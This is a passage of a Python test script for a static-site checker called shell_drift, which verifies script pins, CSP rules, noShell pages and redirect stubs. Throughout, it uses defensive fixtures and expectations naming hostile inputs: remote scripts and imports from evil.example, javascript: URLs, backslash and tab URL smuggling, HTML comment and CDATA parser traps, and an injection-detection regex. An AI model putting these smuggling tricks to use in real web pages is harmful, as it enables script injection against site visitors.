    def put3(d, head, rel='index.html'):
        write(d, rel, '<html><head>%s</head><body></body></html>' % head)

    def st(d):
        r = run(d); return r['status'], r['findings'], r['warnings']

    # F2 CSP meta: what allows the pin and what does not
    for csp, want in (("script-src 'self' https://cdn.jsdelivr.net", 'OK'),
                      ("script-src 'self' https://cdn.jsdelivr.net/gh/", 'OK'),
                      ("script-src *.jsdelivr.net", 'OK'),
                      ("default-src 'self' https:", 'OK'),
                      ("script-src '%s'" % INTEG, 'OK'),
                      ("default-src 'self'; img-src *", 'DRIFT'),
                      ("script-src https://cdn.jsdelivr.net/npm/", 'DRIFT'),
                      ("script-src 'strict-dynamic' https://cdn.jsdelivr.net", 'DRIFT'),
                      ("script-src *; script-src-elem 'self'", 'DRIFT'),
                      ("script-src 'none'", 'DRIFT')):
        d = adv3('k8_cspmeta', 'csp%d' % abs(hash(csp))); put3(d, '<meta http-equiv="Content-Security-Policy" content="%s">%s' % (csp, PIN3))
        s_, f_, w_ = st(d); ok(s_ == want, 'meta CSP %r = %s (%s %s)' % (csp, want, s_, f_))
    d = adv3('k8_cspmeta', 'csp_ro'); put3(d, '<meta http-equiv="Content-Security-Policy-Report-Only" content="script-src \'self\'">' + PIN3)
    ok(st(d)[0] == 'OK', 'report-only CSP does not block the pin = OK')
    # F2 header CSP: _headers, firebase.json, netlify.toml, vercel.json
    hdrs = (('_headers', "/admin/*\n  Content-Security-Policy: script-src 'self'\n", 'OK'),
            ('_headers', "/*\n  X-Frame-Options: DENY\n  Content-Security-Policy: script-src 'self' https://cdn.jsdelivr.net\n", 'OK'),
            ('firebase.json', json.dumps({'hosting': {'headers': [{'source': '**', 'headers': [{'key': 'Content-Security-Policy', 'value': "script-src 'self'"}]}]}}), 'DRIFT'),
            ('firebase.json', json.dumps({'hosting': {'headers': [{'source': '**/*.@(js|css)', 'headers': [{'key': 'Content-Security-Policy', 'value': "script-src 'self'"}]}]}}), 'OK'),
            ('firebase.json', json.dumps({'hosting': [{'headers': [{'source': '/', 'headers': [{'key': 'content-security-policy', 'value': "default-src 'self'"}]}]}]}), 'DRIFT'),
            ('netlify.toml', '[[headers]]\n  for = "/*"\n  [headers.values]\n    Content-Security-Policy = "script-src \'self\'"\n', 'DRIFT'),
            ('netlify.toml', '[[headers]]\n  for = "/*"\n  [headers.values]\n    Content-Security-Policy = "script-src \'self\' https://cdn.jsdelivr.net"\n', 'OK'),
            ('vercel.json', json.dumps({'headers': [{'source': '/(.*)', 'headers': [{'key': 'Content-Security-Policy', 'value': "script-src 'self'"}]}]}), 'DRIFT'),
            ('vercel.json', json.dumps({'headers': [{'source': '/admin/:path*', 'headers': [{'key': 'Content-Security-Policy', 'value': "script-src 'self'"}]}]}), 'OK'))
    for i, (fn, body, want) in enumerate(hdrs):
        d = adv3('k12_headers', 'hdr%d' % i); os.remove(os.path.join(d, '_headers')); write(d, fn, body)
        s_, f_, w_ = st(d); ok(s_ == want, 'header CSP in %s #%d = %s (%s %s)' % (fn, i, want, s_, f_))
    d = adv3('k12_headers', 'hdr_bad'); os.remove(os.path.join(d, '_headers')); write(d, 'firebase.json', '{not json')
    s_, f_, w_ = st(d); ok(s_ == 'WARN' and any('C4 preview' in x for x in w_), 'unreadable firebase.json = WARN (header CSP left to the C4 preview)')
    # F1: main page must run the shell; pages loading room JS need the shell or shell.noShell
    d = adv3('k9_pinelsewhere', 'k9_fixed'); put3(d, FB + PIN3)
    ok(st(d)[0] == 'OK', 'same room with the pin on index.html = OK')
    tk = b'/* takedown */\n'
    write(d, 'takedown.js', tk); write(d, 'terms.html', '<html><script src="takedown.js" defer></script></html>')
    # (C14: a bare location.replace('/') is now a redirect stub, so this C12 case uses a non-redirect inline script)
    write(d, 'nest.html', "<html><script>document.title='nest'</script></html>")
    reshell(d, lambda sh: sh.update(keep=[{'file': 'takedown.js', 'sha256': sha(tk), 'reason': 't'}],
                                    overrides={'inline': [{'page': 'nest.html', 'sha256': sha(b"document.title='nest'"), 'reason': 'nest title'}]}))
    s_, f_, w_ = st(d); ok(s_ == 'DRIFT' and any('terms.html loads room JS (takedown.js) but runs no shell' in x for x in f_),
                          'terms.html loading a keep file without the shell, not in noShell = DRIFT')
    reshell(d, lambda sh: sh.update(noShell=['terms.html']))
    s_, f_, w_ = st(d); ok(s_ == 'DRIFT' and f_ == ['nest.html loads room JS (inline <script>) but runs no shell; list it in shell.noShell '
                                                   'if it is meant to run without the shell'],
                          'C12: declared inline code on an unpinned page counts as room JS (nest.html not in noShell = DRIFT) (%s)' % f_)
    reshell(d, lambda sh: sh.update(noShell=['terms.html', 'nest.html']))
    s_, f_, w_ = st(d); ok(s_ == 'DRIFT' and f_ == ['nest.html:1: an inline <script> that is not the stub or 404 template on a noShell '
                                                   'page (outside the noShell grammar)'],
                          'C15 grammar: declared classic inline code on a noShell page = DRIFT (only the stub/404 templates) (%s)' % f_)
    write(d, 'nest.html', "<html><script type=\"module\">document.title='nest'</script></html>")
    s_, f_, w_ = st(d); ok(s_ == 'OK', 'terms.html + nest.html (declared inline module) in shell.noShell = OK (%s)' % f_)
    # C11: a noShell page may load only keep files (noShellOk when the room uses the flag) and declared inline code
    reshell(d, lambda sh: sh.update(keep=[{'file': 'takedown.js', 'sha256': sha(tk), 'reason': 't', 'noShellOk': False}]))
    s_, f_, w_ = st(d); ok(s_ == 'DRIFT' and any('keep file takedown.js (not flagged noShellOk)' in x for x in f_),
                          'C11: keep file with noShellOk false on a noShell page = DRIFT (%s)' % f_)
    reshell(d, lambda sh: sh.update(keep=[{'file': 'takedown.js', 'sha256': sha(tk), 'reason': 't', 'noShellOk': True}]))
    ok(st(d)[0] == 'OK', 'C11: keep file flagged noShellOk on a noShell page = OK')
    for extra, needle in (('<script src="https://cdn.jsdelivr.net/npm/emoji-picker-element@1/index.js" type="module"></script>', 'remote script'),
                          (FB, 'Firebase SDK'),
                          ('<iframe src="https://www.youtube-nocookie.com/embed/x"></iframe>', '<iframe src='),
                          ('<object data="x.pdf"></object>', '<object>')):
        write(d, 'terms.html', '<html><script src="takedown.js" defer></script>%s</html>' % extra)
        s_, f_, w_ = st(d); ok(s_ == 'DRIFT' and any('noShell page loads' in x and needle in x for x in f_),
                              'C11: %s on a noShell page = DRIFT (%s)' % (needle, f_))
    imp = b'import "./mod.js";\n'; write(d, 'mod.js', b'window.y=1;\n')
    write(d, 'takedown.js', imp); write(d, 'terms.html', '<html><script src="takedown.js" defer></script></html>')
    reshell(d, lambda sh: sh.update(keep=[{'file': 'takedown.js', 'sha256': sha(imp), 'reason': 't'},
                                          {'file': 'mod.js', 'sha256': sha(b'window.y=1;\n'), 'reason': 't'}]))
    s_, f_, w_ = st(d); ok(s_ == 'DRIFT' and any('loaded on noShell page terms.html but imports modules' in x for x in f_),
                          'C11: keep file that imports modules on a noShell page = DRIFT (%s)' % f_)
    write(d, 'takedown.js', tk)
    reshell(d, lambda sh: sh.update(keep=[{'file': 'takedown.js', 'sha256': sha(tk), 'reason': 't'}]))
    put3(d, FB + PIN3, 'terms.html')
    s_, f_, w_ = st(d); ok(s_ == 'WARN' and any('terms.html is listed in shell.noShell but runs the shell' in x for x in w_),
                          'noShell page that runs the shell = WARN, remove it (%s %s)' % (f_, w_))
    reshell(d, lambda sh: sh.update(noShell=['terms.html', 'index.html', 'gone.html']))
    s_, f_, w_ = st(d); ok(s_ == 'DRIFT' and any('noShell lists index.html' in x for x in f_) and any('gone.html does not exist' in x for x in f_),
                          'noShell listing index.html or a missing page = DRIFT')
    d = adv3('k9_pinelsewhere', 'k9_noindex'); os.rename(os.path.join(d, 'index.html'), os.path.join(d, 'home.html'))
    ok(any('no index.html' in x for x in st(d)[1]), 'room without index.html = DRIFT')
    # C7: svg script href to a declared local module = OK (it is a script source)
    d = adv3('k4a_svghref', 'k4a_local'); ext = b'window.x=1;\n'; write(d, 'ext.js', ext)
    put3(d, '<svg><script href="ext.js"></script></svg>' + PIN3)
    reshell(d, lambda sh: sh.update(overrides={'modules': [{'file': 'ext.js', 'sha256': sha(ext), 'hooks': [], 'load': 'before', 'reason': 't'}]}))
    ok(st(d)[0] == 'OK', 'svg <script href> to a declared local module = OK')
    reshell(d, lambda sh: sh.update(overrides={}))
    ok(any('undeclared local script ext.js' in x for x in st(d)[1]), 'svg <script href> to an undeclared local file = DRIFT')
    # C8: meta refresh
    d = adv3('k1_metarefresh', 'k1_decl')
    reshell(d, lambda sh: sh.update(overrides={'refresh': [{'page': 'index.html', 'url': 'https://evil.example/', 'reason': 'moved'}]}))
    s_, f_, w_ = st(d); ok(s_ == 'WARN' and any('(declared)' in x for x in w_), 'declared remote meta refresh = WARN only (%s)' % f_)
    for content, want in (('5; url=/about.html', 'OK'), ('0', 'OK'), ("0;URL='javascript:alert(1)'", 'DRIFT'), ('0,data:text/html,x', 'DRIFT'), ('0;url=//evil.example/', 'DRIFT')):
        d = adv3('k1_metarefresh', 'k1_%d' % abs(hash(content))); put3(d, '<meta http-equiv="refresh" content="%s">%s' % (content, PIN3))
        s_, f_, w_ = st(d); ok(s_ == want, 'meta refresh %r = %s (%s %s)' % (content, want, s_, f_))
    # C8: local modulepreload / @import are quiet; remote CSS @import in a room .css file = WARN
    d = adv3('k2_modulepreload', 'k2_local'); put3(d, '<link rel="modulepreload" href="ext.js"><style>@import url(local.css);</style>' + PIN3)
    write(d, 'local.css', '@import url("https://fonts.example/x.css");\n')
    s_, f_, w_ = st(d); ok(s_ == 'WARN' and w_ == ['local.css CSS @import of remote https://fonts.example/x.css'], 'local preload/@import quiet; remote @import in a .css file = WARN (%s)' % w_)
    # C8/C9: classic bare pin = OK; fragment on the pin = DRIFT
    d = adv3('k11_modulepin', 'k11_classic'); put3(d, PIN3)
    ok(st(d)[0] == 'OK', 'classic bare pin = OK')
    d = adv3('k14_pinquery', 'k14_frag'); put3(d, PIN3.replace('factory.js"', 'factory.js#x"'))
    ok(st(d)[0] == 'DRIFT', 'pin with a #fragment = DRIFT')
    d = adv3('k13_frameset', 'k13_decl')
    reshell(d, lambda sh: sh.update(overrides={'frames': [{'page': 'index.html', 'src': 'https://evil.example/', 'reason': 't'}]}))
    ok(st(d)[0] == 'DRIFT' and not st(d)[2], 'declared remote <frame> clears its WARN; the <frameset> still kills the pin = DRIFT (N3)')

# real-room shapes (gaichat/415chat/atmchat after the migration sim: script/link/meta skeletons, real inline + keep bytes)
REAL = os.path.join(ROOT, 'test', 'fixtures', 'shell_drift', 'real_shape')
for name in sorted(os.listdir(REAL)):
    with tempfile.TemporaryDirectory() as t:
        d = os.path.join(t, name); shutil.copytree(os.path.join(REAL, name), d)
        r = run(d)
        ok(r['status'] == 'WARN' and not r['findings'] and len(r['warnings']) == 1 and 'emoji-picker-element@1' in r['warnings'][0],
           'real-shape %s migrated = WARN, emoji-picker@1 only (%s %s)' % (name, r['findings'], r['warnings']))
        s = json.load(open(os.path.join(d, 'site.json')))
        if s['shell'].get('noShell'):
            s['shell'].pop('noShell'); json.dump(s, open(os.path.join(d, 'site.json'), 'w'))
            r = run(d); ok(r['status'] == 'DRIFT' and all('but runs no shell' in x for x in r['findings'])
                           and any(x.startswith('404.html loads room JS (inline <script>)') for x in r['findings']),
                           'real-shape %s without noShell = DRIFT only on the unlisted pages, 404.html included' % name)

# adv4 (Juno, Key 2 at 5a7dbbc): noShell restrictions (C11/C12) and more CSP placements
ADV4 = os.path.join(ROOT, 'test', 'fixtures', 'shell_drift', 'adv4')
ADV4_EXPECT = {
    'n1_noshell_keep': ('OK', None, None),
    'n2_noshell_module': ('DRIFT', 'noShell page loads module ext/room.js', None),
    'n3_noshell_keep_writer': ('DRIFT', 'noShell page loads Firebase SDK', None),
    'n4_inline_noshell_unlisted': ('DRIFT', 'about.html loads room JS (Firebase SDK) but runs no shell', None),
    'n5_noshell_dotindex': ('DRIFT', 'shell.noShell lists index.html', None),
    'n6_noshell_undeclared': ('DRIFT', 'undeclared local script x.js', None),
    'c1_two_meta': ('DRIFT', 'pin is blocked by', None),
    'c2_comma_policies': ('DRIFT', 'pin is blocked by', None),
    'c3_nonce_ok': ('DRIFT', 'outside the pin template (nonce)', None),  # N3: no nonce on the pin
    'c4_nonce_bad': ('DRIFT', 'outside the pin template (nonce)', None),
    'c5_meta_after_pin': ('DRIFT', 'pin is blocked by', None),
    'c6_report_only': ('OK', None, None),
    'c7_hash_only': ('OK', None, None),
    'c8_headers_root': ('DRIFT', '_headers header CSP for /', None),
    'c9_netlify_root': ('DRIFT', 'netlify.toml header CSP for /', None),
    'c10_firebase_bad': ('WARN', None, 'covered only by the C4 preview'),
    'c11_elem_overrides': ('OK', None, None),
    'c12_strict_dynamic_host': ('DRIFT', 'pin is blocked by', None),
    'c13_meta_in_body': ('DRIFT', 'pin is blocked by', None),
    'c14_vercel_root': ('DRIFT', 'vercel.json header CSP for /', None),
    'c15_firebase_glob': ('DRIFT', 'firebase.json header CSP for **', None),
}
ok(sorted(ADV4_EXPECT) == sorted(x for x in os.listdir(ADV4) if os.path.isdir(os.path.join(ADV4, x))), 'every adv4 fixture room has an expectation')
for name, (st, needle, wneedle) in sorted(ADV4_EXPECT.items()):
    with tempfile.TemporaryDirectory() as t:
        d = os.path.join(t, name); shutil.copytree(os.path.join(ADV4, name), d)
        r = run(d)
        good = r['status'] == st and (needle is None or any(needle in x for x in r['findings'])) \
            and (wneedle is None or any(wneedle in x for x in r['warnings']))
        ok(good, 'adv4 %s = %s%s (%s %s %s)' % (name, st, ' with "%s"' % needle if needle else '', r['status'], r['findings'], r['warnings']))

# adv5 (Juno, Key 2 on #30): noShell inline limits; b2/b3 need C15
ADV5 = os.path.join(ROOT, 'test', 'fixtures', 'shell_drift', 'adv5')
ADV6 = os.path.join(ROOT, 'test', 'fixtures', 'shell_drift', 'adv6')
ADV5_EXPECT = {
    'b1_noshell_inline_dynimport': ('DRIFT', 'injects or evaluates code at runtime', None),
    'b2_noshell_inline_injects_declared': ('DRIFT', 'noShell page declares inline code with "injects"', None),
    'b3_noshell_inline_fbmodule': ('DRIFT', 'noShell page loads Firebase SDK', None),
    'b4_keep_imports_module': ('DRIFT', 'but imports modules', None),
    'b5_handler_only_unlisted': ('DRIFT', 'about.html loads room JS (<body onload=>) but runs no shell', None),
    'b6_noshell_runs_shell': ('WARN', None, 'listed in shell.noShell but runs the shell'),
}
# adv6: C14 redirect stubs (s*) and C15 Firebase-host imports on noShell pages (f*)
ADV6_EXPECT = {
    's0_stubs_ok': ('OK', None, None),
    's1_redirects_declared': ('OK', None, None),
    's2_near_template_fetch': ('DRIFT', 'carries the nest_stubs.py marker but is not a redirect stub: its inline script is neither', None),
    's3_cross_origin': ('DRIFT', 'go.html loads room JS (inline <script>) but runs no shell', None),
    's3b_cross_origin_declared': ('DRIFT', 'go.html is listed in shell.redirects but is not a redirect stub', None),
    's4_extra_inline': ('DRIFT', 'not a redirect stub: it has 2 scripts', None),
    's5_handler': ('DRIFT', 'not a redirect stub: it has on*= handlers', None),
    's6_iframe': ('DRIFT', 'not a redirect stub: it has frames', None),
    's7_form': ('DRIFT', 'not a redirect stub: it has a form', None),
    's8_external_script': ('DRIFT', 'loads undeclared remote script https://evil.example/x.js', None),
    's9_protocol_relative': ('DRIFT', 'go.html loads room JS (inline <script>) but runs no shell', None),
    's9b_backslash': ('DRIFT', 'go.html loads room JS (inline <script>) but runs no shell', None),
    's9c_refresh_protocol_relative': ('DRIFT', 'not a redirect stub: its meta refresh does not stay on the origin', None),
    's10_slug_breakout': ('DRIFT', 'carries the nest_stubs.py marker but is not a redirect stub', None),
    's11_redirects_not_stub': ('DRIFT', 'terms.html is listed in shell.redirects but is not a redirect stub', None),
    'f1_noshell_dyn_firebase': ('DRIFT', 'noShell page loads Firebase SDK (inline <script> names gstatic.com/firebasejs/)', None),
    'f2_noshell_esm_firebase': ('DRIFT', 'noShell page declares remote "imports" https://esm.sh/firebase', None),
}
for tag, base, expect in (('adv5', ADV5, ADV5_EXPECT), ('adv6', ADV6, ADV6_EXPECT)):
    ok(sorted(expect) == sorted(x for x in os.listdir(base) if os.path.isdir(os.path.join(base, x))), 'every %s fixture room has an expectation' % tag)
    for name, (st, needle, wneedle) in sorted(expect.items()):
        with tempfile.TemporaryDirectory() as t:
            d = os.path.join(t, name); shutil.copytree(os.path.join(base, name), d)
            r = run(d)
            good = r['status'] == st and (needle is None or any(needle in x for x in r['findings'])) \
                and (wneedle is None or any(wneedle in x for x in r['warnings']))
            if st == 'OK':
                good = good and not r['findings'] and not r['warnings']
            ok(good, '%s %s = %s%s (%s %s %s)' % (tag, name, st, ' with "%s"' % needle if needle else '', r['status'], r['findings'], r['warnings']))

# adv7: review fixes (Key 2 at 7aa0716). Every room must DRIFT with the needle.
ADV7 = os.path.join(ROOT, 'test', 'fixtures', 'shell_drift', 'adv7')
ADV7_EXPECT = {}
for i, tok in enumerate(['<!-->', '--!>', '<!--->']):  # B1-B3 comment ends
    for kind in ('stub', 'index', 'noshell'):
        ADV7_EXPECT['k%d_%s_comment' % (i, kind)] = 'has %s: browsers end a comment there' % tok
# B4/B5: URLs are read the way a browser reads them (\\ is /, tab/CR/LF dropped, edge C0/space stripped)
ADV7_PREP = {'n0_src_backslash_keep': {'\\evil.example/x.js': '/* looks local */\n'},
             'n1_src_tab_entity_keep': {'\t/evil.example/x.js': '/* looks local */\n'}}
for name in ('n0_src_backslash_keep', 'n1_src_tab_entity_keep', 'n2_src_newline'):
    ADV7_EXPECT[name] = 'loads undeclared remote script //evil.example/x.js'
ADV7_EXPECT['n3_import_backslash'] = 'a module specifier with a backslash'
for i in range(4):
    ADV7_EXPECT['r%d_refresh' % i] = 'go.html:1 undeclared <meta http-equiv=refresh> to remote //evil.example/'
# B6: shell.redirects entries outside the room (the test also puts a stub at <tmp>/outside.html, next to the room)
for i in range(7):
    ADV7_EXPECT['d%d_redirects_outside' % i] = 'is not a page path inside the room'
# B7: keep files on noShell pages are scanned for the C15 Firebase-host patterns
for i in range(3):
    ADV7_EXPECT['f%d_noshell_keep_firebase' % i] = 'takedown.js is loaded on noShell page terms.html and names the Firebase SDK'
# Review nit: index.html shaped like a bare stub is still the main page (its inline script is checked, no stub counted)
ADV7_EXPECT['i0_index_bare_stub'] = 'index.html:1 undeclared inline <script>'
with tempfile.TemporaryDirectory() as t:
    d = os.path.join(t, 'i0'); shutil.copytree(os.path.join(ADV7, 'i0_index_bare_stub'), d)
    r = run(d); ok(r['layers'].get('redirectStubs') == 0, 'index.html is never counted as a redirect stub (%s)' % r['layers'])
# ADV7 more
ok(sorted(ADV7_EXPECT) == sorted(x for x in os.listdir(ADV7) if os.path.isdir(os.path.join(ADV7, x))), 'every adv7 fixture room has an expectation')
for name, needle in sorted(ADV7_EXPECT.items()):
    with tempfile.TemporaryDirectory() as t:
        d = os.path.join(t, name); shutil.copytree(os.path.join(ADV7, name), d)
        open(os.path.join(t, 'outside.html'), 'w').write("<html><head><script>location.replace('/')</script></head></html>")
        for fn, body in ADV7_PREP.get(name, {}).items():
            os.makedirs(os.path.dirname(os.path.join(d, fn)), exist_ok=True); open(os.path.join(d, fn), 'w').write(body)
        r = run(d)
        ok(r['status'] == 'DRIFT' and any(needle in x for x in r['findings']),
           'adv7 %s = DRIFT with "%s" (%s %s)' % (name, needle, r['status'], r['findings']))

# adv8: review fixes (Key 2 at 442d04b, B8-B13). Each room was OK at 442d04b; status and needle now.
ADV8 = os.path.join(ROOT, 'test', 'fixtures', 'shell_drift', 'adv8')
ADV8_EXPECT = {}
# B8/B9: <!-- inside RCDATA/RAWTEXT (text to a browser, a comment to html.parser) and script double-escape, any page
for t_ in ('textarea', 'title', 'noscript', 'iframe', 'xmp', 'noembed', 'noframes'):
    for k_ in ('pinned', 'stub'):
        ADV8_EXPECT['h_%s_%s' % (t_, k_)] = ('DRIFT', '<%s> contains <!--' % t_)
ADV8_EXPECT['h_dblescape_pinned'] = ('DRIFT', 'script text contains <!--')
# B10: any <![ (CDATA / marked section), on any page; c_svg_cdata_ok is inert in a browser but DRIFT by rule
for n_ in ('h_cdata_pinned', 'h_cdata_stub', 'c_svg_cdata_ok'):
    ADV8_EXPECT[n_] = ('DRIFT', 'has <![ (CDATA or marked section)')
ADV8_EXPECT['c_bang_gt_ok'] = ('DRIFT', 'has --!>')  # known false positive (<!--!>), kept
# B11: a JS specifier with a backslash is DRIFT (\\ is a string escape in JS, not a path separator)
ADV8_EXPECT['j0_unicode_escape_spec'] = ('DRIFT', 'a module specifier with a backslash')
# B12: comments around import / from are skipped by the scanner
for n_ in ('j1_comment_before_from', 'j2_comment_before_import', 'j3_comment_after_import', 'j4_noshell_comment_import'):
    ADV8_EXPECT[n_] = ('DRIFT', 'statically imports https://evil.example/x.js')
# B13: a keep file loaded on a noShell page may not declare "injects"
for n_ in ('k0_concat', 'k1_variable', 'k2_createscript', 'k4_escaped_host'):
    ADV8_EXPECT[n_] = ('DRIFT', 'takedown.js is loaded on noShell page terms.html but declares "injects"')
# hardening beyond B8-B13: other parser splits, and the C14/C15 grammar
ADV8_EXPECT['x0_doctype_subset_pinned'] = ('DRIFT', 'only <!DOCTYPE html> is allowed')
ADV8_EXPECT['x1_svg_style_pinned'] = ('DRIFT', 'contains markup after an <svg>/<math>')
ADV8_EXPECT['x2_selfclose_inline_pinned'] = ('DRIFT', 'a browser runs inline script text')
ADV8_EXPECT['x3_stub_extra_comment'] = ('DRIFT', 'outside the redirect-stub grammar (line 1: a comment <!-- hi -->)')
ADV8_EXPECT['x4_noshell_handler'] = ('DRIFT', 'inline code in <img onerror=> on a noShell page')
ADV8_EXPECT['x5_noshell_modpreload'] = ('DRIFT', 'noShell page has remote <link rel=modulepreload')
# controls: must stay OK
for n_ in ('c_dashdash_ok', 'c_template_comment_ok', 'x6_real_shapes_ok', 'x7_import_comment_local_ok'):
    ADV8_EXPECT[n_] = ('OK', None)
ok(sorted(ADV8_EXPECT) == sorted(x for x in os.listdir(ADV8) if os.path.isdir(os.path.join(ADV8, x))), 'every adv8 fixture room has an expectation')
for name, (st_, needle) in sorted(ADV8_EXPECT.items()):
    with tempfile.TemporaryDirectory() as t:
        d = os.path.join(t, name); shutil.copytree(os.path.join(ADV8, name), d)
        r = run(d)
        good = r['status'] == st_ and (needle is None or any(needle in x for x in r['findings']))
        if st_ == 'OK':
            good = good and not r['findings'] and not r['warnings']
        ok(good, 'adv8 %s = %s%s (%s %s %s)' % (name, st_, ' with "%s"' % needle if needle else '', r['status'], r['findings'], r['warnings']))
with tempfile.TemporaryDirectory() as t:
    d = os.path.join(t, 'x6'); shutil.copytree(os.path.join(ADV8, 'x6_real_shapes_ok'), d)
    r = run(d); ok(r['layers'].get('redirectStubs') == 1, 'the marker-comment nest stub is still a redirect stub (%s)' % r['layers'])
# C15 is scoped to noShell pages: the b2 page running the pin keeps its declared "injects"
with tempfile.TemporaryDirectory() as t:
    d = os.path.join(t, 'b2'); shutil.copytree(os.path.join(ADV5, 'b2_noshell_inline_injects_declared'), d)
    s_ = json.load(open(os.path.join(d, 'site.json'))); s_['shell'].pop('noShell'); json.dump(s_, open(os.path.join(d, 'site.json'), 'w'))
    pin_tag = re.search(r'<script[^>]*shell/v[^>]*></script>', open(os.path.join(d, 'index.html')).read()).group(0)
    terms = open(os.path.join(d, 'terms.html')).read().replace('<html>', '<html>' + pin_tag, 1)
    open(os.path.join(d, 'terms.html'), 'w').write(terms)
    r = run(d); ok(r['status'] == 'OK' and not any('injects' in x for x in r['findings']),
                   'C15: declared "injects" on a page that runs the pin is not a noShell finding (%s %s)' % (r['status'], r['findings']))

# C14 on the real-shape rooms: nest stubs need no noShell; only non-stub pages (404, legal) are named without it
for name in ('gaichat', '415chat', 'atmchat'):
    with tempfile.TemporaryDirectory() as t:
        d = os.path.join(t, name); shutil.copytree(os.path.join(REAL, name), d)
        s_ = json.load(open(os.path.join(d, 'site.json'))); ns_ = s_['shell'].pop('noShell')
        json.dump(s_, open(os.path.join(d, 'site.json'), 'w'))
        r = run(d)
        named = {x.split(' ')[0] for x in r['findings']}
        ok(r['status'] == 'DRIFT' and '404.html' in named and len(named) < len(ns_) and r['layers'].get('redirectStubs', 0) > 0,
           'C14 real-shape %s: stubs drop out of noShell (%d listed, %d still need it: %s)' % (name, len(ns_), len(named), sorted(named)))

# CSP3: every integrity hash on the tag must be listed in the policy, not just one
sys.dont_write_bytecode = True
sys.path.insert(0, os.path.join(ROOT, 'tools'))
import shell_drift as SD  # noqa: E402
# unit checks for the B8-B12 helpers
toks_ = SD.browser_tokens('<!DOCTYPE html><textarea><!--</textarea><script src=a>x</script><!--->b<script/>c</script>')
ok([(t_['kind'], t_.get('name')) for t_ in toks_] == [('decl', None), ('start', 'textarea'), ('raw', 'textarea'), ('end', 'textarea'),
                                                     ('start', 'script'), ('raw', 'script'), ('end', 'script'), ('comment', None),
                                                     ('start', 'script'), ('raw', 'script'), ('end', 'script')],
   'browser_tokens: RCDATA ends at </textarea>, <!---> ends a comment, <script/> still opens script data (%s)' % toks_)
ok(SD.browser_tokens('<a b="1"c=2 d>')[0]['attrs'] == [('b', '1'), ('c', '2'), ('d', None)], 'browser_tokens: spec attribute splitting')
ok(SD.norm_js('\t./a.js\n') == './a.js' and SD.norm_js('/\\x') == '/\\x', 'norm_js: no backslash-to-slash for JS specifiers (B11)')
for src_, want_ in (("import a from/**/'x';", ['x']), ("/**/import 'x'", ['x']), ("import/**/'x'", ['x']), ("import // c\n'x'", ['x']),
                    ("import {a, /* , */ b} from './y.js'", ['./y.js']), ("var s = 'import'; o.import('z')", []), ("export const a = 'x'", [])):
    ok(SD.import_specs(src_) == want_, 'import_specs(%r) = %s (B12, got %s)' % (src_, want_, SD.import_specs(src_)))
for src_ in ('import/**/("x")', 'new/**/Function("x")', 'eval /* */ (x)', 'createElement(/**/"script")'):
    ok(SD.INJECT_RE.search(src_) is not None, 'INJECT_RE sees %r through comments (B12)' % src_)
for raw, want in [('/\\evil.example/x.js', '//evil.example/x.js'), ('\x00 /\t/evil.example/\n', '//evil.example/'),
                  ('\\\\evil.example/', '//evil.example/'), ('lib/a.js', 'lib/a.js'), (None, '')]:
    ok(SD.norm_url(raw) == want, 'norm_url(%r) = %r (got %r)' % (raw, want, SD.norm_url(raw)))
    ok(bool(SD.REMOTE_RE.match(SD.norm_url(raw))) == want.startswith('//'), 'norm_url(%r) remote decision' % (raw,))
ok(SD.local_ref('index.html', '%2e%2e/x.js') is None and SD.local_ref('a/b.html', '%2e%2e/x.js') == 'x.js',
   'local_ref percent-decodes %2e before deciding whether a path leaves the room')
two = INTEG + ' sha512-' + 'A' * 86 + '=='
ok(SD.csp_allows_pin({'script-src': ["'%s'" % INTEG]}, URL, INTEG, None), 'csp_allows_pin: the single pin hash listed = allowed')
ok(not SD.csp_allows_pin({'script-src': ["'%s'" % INTEG]}, URL, two, None), 'csp_allows_pin: only one of two integrity hashes listed = blocked')
ok(SD.csp_allows_pin({'script-src': ["'%s'" % x for x in two.split()]}, URL, two, None), 'csp_allows_pin: all integrity hashes listed = allowed')

# C14 unit cases on the parser
def stub_of(html):
    p_ = SD._Page(); p_.feed(html); return SD.redirect_stub(p_)
TPL = SD.NEST_TEMPLATE.replace('{slug}', 'boston')
ok(stub_of('<script>%s</script>' % TPL)[0], 'C14: nest_stubs.py template = redirect stub')
ok(stub_of('<script>%s</script>' % TPL.replace('\n', '\r\n'))[0], 'C14: CRLF nest_stubs.py template = redirect stub')
ok(not stub_of('<script>%s</script>' % SD.NEST_TEMPLATE.replace('{slug}', 'Boston')).__getitem__(0), 'C14: non-slug path literal is not a stub')
ok(not stub_of(open(os.path.join(REAL, 'atmchat', '404.html')).read())[0], 'C14: the 404.html restore script is not a stub (it stays noShell)')
ok(stub_of("<script>location.replace('/')</script>")[0] and stub_of('<script>window.location.replace("/#explore");</script>')[0],
   'C14: bare same-origin location.replace = redirect stub')
for bad in ("location.replace('//e.example')", "location.replace('/\\\\e.example')", "location.replace('/\\t/e.example')",
            "location.replace(' //e.example')", "location.replace('https://e.example/')", "location.replace('/x');fetch('/y')",
            "location.href='/'", "location.replace('javascript:alert(1)')"):
    ok(not stub_of('<script>%s</script>' % bad)[0], 'C14: %s is not a stub' % bad)
ok(not stub_of('<script type="module">%s</script>' % TPL)[0], 'C14: a module script is not a stub')
ok(not stub_of('<script>%s</script><a href="javascript:void(0)">x</a>' % TPL)[0], 'C14: a javascript: URL disqualifies a stub')
ok(not stub_of('<base href="https://e.example/"><script>%s</script>' % TPL)[0], 'C14: <base href> disqualifies a stub')
ok(not stub_of('<link rel="modulepreload" href="/x.js"><script>%s</script>' % TPL)[0], 'C14: a script preload disqualifies a stub')
ok(not stub_of('<button formaction="https://e.example/">x</button><script>%s</script>' % TPL)[0], 'C14: formaction disqualifies a stub')
ok(stub_of('<meta http-equiv="refresh" content="0;url=/#explore"><script>%s</script>' % TPL)[0], 'C14: same-origin meta refresh keeps a stub')

# comment ends are flagged on the raw page, whatever html.parser makes of them
with tempfile.TemporaryDirectory() as t:
    for i, html in enumerate(['<html><!-->x-->', '<html><!-- a --!> b -->', '<html><!--->x-->', '<html><!---->ok<!-- ok --></html>']):
        open(os.path.join(t, 'p%d.html' % i), 'w').write(html)
    traps = {pg: p_.comment_traps for pg, p_ in SD.pages(t)}
    ok(all(traps['p%d.html' % i] for i in range(3)) and not traps['p3.html'], 'comment ends: <!-->, --!>, <!---> flagged; <!----> and <!-- --> are not')

# ---- adv9 (Juno, Key 2 at 822a668): N1-N6 rooms DRIFT, the 11 benign rooms OK, N4 HTML-like-comment rooms known gaps ----
ADV9 = os.path.join(ROOT, 'test', 'fixtures', 'shell_drift', 'adv9')
ADV9_EXPECT = {
